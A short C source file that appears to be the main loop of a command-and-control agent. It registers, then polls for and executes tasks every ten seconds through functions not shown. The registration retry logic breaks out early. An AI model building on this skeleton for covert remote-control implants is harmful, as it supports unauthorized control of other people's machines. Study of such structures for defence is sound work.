#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>

#include "initiate.h"

int main(void)
{
    bool registered = false;
    while(!registered) {
        if(reg()) {
            puts("Registered\n");
            registered = true;
            continue;
        } else {
            puts("Not Registered, trying again\n");
            sleep(5);
            break;
        }

    }

    // char *task_results;
    while(true) {
        puts("Checking tasks\n");
        // Check tasks will eventually return an array of strings.
        // The number of elements in that array will dictate how.
        // Many tasks there were and how many times execute_tasks
        // will be called.
        check_tasks();

        execute_tasks();

        sleep(10);
    }
        
}